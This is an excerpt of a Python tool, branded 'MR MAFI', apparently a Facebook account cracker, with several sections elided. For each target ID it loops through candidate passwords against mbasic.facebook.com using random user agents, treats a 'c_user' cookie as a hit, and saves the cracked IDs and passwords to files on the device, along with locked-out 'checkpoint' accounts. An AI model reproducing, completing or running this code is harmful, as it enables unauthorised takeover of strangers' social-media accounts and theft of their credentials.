...
#os.system("xdg-open https://github.com/MR MAFI-143")
logo=("""\033[92;1m
...
1;93m×××××××××××××××××\033[1;93m××××××××××××××\033[1;93m××××××××××××××××××
 ...
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mMR MAFI-143               \033[1;93m|
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://github.com/MR MAFI-143');time.sleep(1)
		admin()
	if bal =='3':
		Main()
def x():
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/MR MAFI-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
                ...
                print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/MR MAFI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[ MR MAFI ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.write(f" \r{R} [{B} MR MAFI{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m MR MAFI \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/MR MAFI-ok.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
